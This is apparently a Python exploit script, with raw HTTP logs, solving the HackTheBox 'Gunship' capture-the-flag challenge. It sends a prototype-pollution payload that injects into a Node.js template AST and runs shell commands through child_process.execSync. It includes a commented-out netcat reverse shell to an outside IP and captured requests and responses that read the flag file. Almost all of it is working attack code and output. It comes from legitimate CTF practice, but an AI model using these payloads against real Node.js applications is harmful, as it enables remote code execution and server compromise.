#https://sec.stealthcopter.com/htb-ctf-write-up-gunship/
#https://harshitm98.github.io/posts/htb-challenge-gunship/
#https://scc-luhack.lancs.ac.uk/writeups/view/gunship

import requests

TARGET_URL = 'http://159.65.20.166:31961'

# make pollution
r = requests.post(TARGET_URL+'/api/submit', json = {
    "artist.name":"Gingell",
    "__proto__.type": "Program",
    "__proto__.body": [{
        "type": "MustacheStatement",
        "path": 0,
        "params": [{
            "type": "NumberLiteral",
            "value": "process.mainModule.require('child_process').execSync(`whoami > /app/static/out`)"
            #"value": "process.mainModule.require('child_process').execSync(`nc 178.62.102.205 4444 -e /bin/sh`)"
        }],
        "loc": {
            "start": 0,
            "end": 0
        }
    }]
    })

print(r.status_code)
print(r.text)

print(requests.get(TARGET_URL+'/static/images/out').text)
#But failed... BP works well.
'''
POST /api/submit HTTP/1.1
Host: 159.65.20.166:31961
Content-Length: 158
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.20.166:31961
Referer: http://159.65.20.166:31961/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

{
	"artist.name":"Haigh","__proto__.block": {
	"type": "Text",
	"line": "process.mainModule.require('child_process').execSync('$(ls | grep flag)')"
	}
}


Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Command failed: $(ls | grep flag)<br>/bin/sh: flagi0Otc: not found<br> on line 1<br> &nbsp; &nbsp;at checkExecSyncError (child_process.js:621:11)<br> &nbsp; &nbsp;at Object.execSync (child_process.js:657:15)<br> &nbsp; &nbsp;at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), &lt;anonymous&gt;:13:63)<br> &nbsp; &nbsp;at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), &lt;anonymous&gt;:17:7)<br> &nbsp; &nbsp;at /app/routes/index.js:16:81<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /app/node_modules/express/lib/router/index.js:281:22</pre>
</body>
</html>

POST /api/submit HTTP/1.1
Host: 159.65.20.166:31961
Content-Length: 157
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.70 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: http://159.65.20.166:31961
Referer: http://159.65.20.166:31961/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
Connection: close

{
	"artist.name":"Haigh","__proto__.block": {
	"type": "Text",
	"line": "process.mainModule.require('child_process').execSync('$(cat flagi0Otc)')"
	}
}

HTTP/1.1 500 Internal Server Error
X-Powered-By: Express
Content-Security-Policy: default-src 'none'
X-Content-Type-Options: nosniff
Content-Type: text/html; charset=utf-8
Content-Length: 1111
Date: Tue, 28 Nov 2023 03:12:55 GMT
Connection: close

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Error</title>
</head>
<body>
<pre>Error: Command failed: $(cat flagi0Otc)<br>/bin/sh: HTB{wh3n_lif3_g1v3s_y0u_p6_st4rT_p0llut1ng_w1th_styl3!!}: not found<br> on line 1<br> &nbsp; &nbsp;at checkExecSyncError (child_process.js:621:11)<br> &nbsp; &nbsp;at Object.execSync (child_process.js:657:15)<br> &nbsp; &nbsp;at eval (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), &lt;anonymous&gt;:13:63)<br> &nbsp; &nbsp;at template (eval at wrap (/app/node_modules/pug-runtime/wrap.js:6:10), &lt;anonymous&gt;:17:7)<br> &nbsp; &nbsp;at /app/routes/index.js:16:81<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at next (/app/node_modules/express/lib/router/route.js:137:13)<br> &nbsp; &nbsp;at Route.dispatch (/app/node_modules/express/lib/router/route.js:112:3)<br> &nbsp; &nbsp;at Layer.handle [as handle_request] (/app/node_modules/express/lib/router/layer.js:95:5)<br> &nbsp; &nbsp;at /app/node_modules/express/lib/router/index.js:281:22</pre>
</body>
</html>
'''
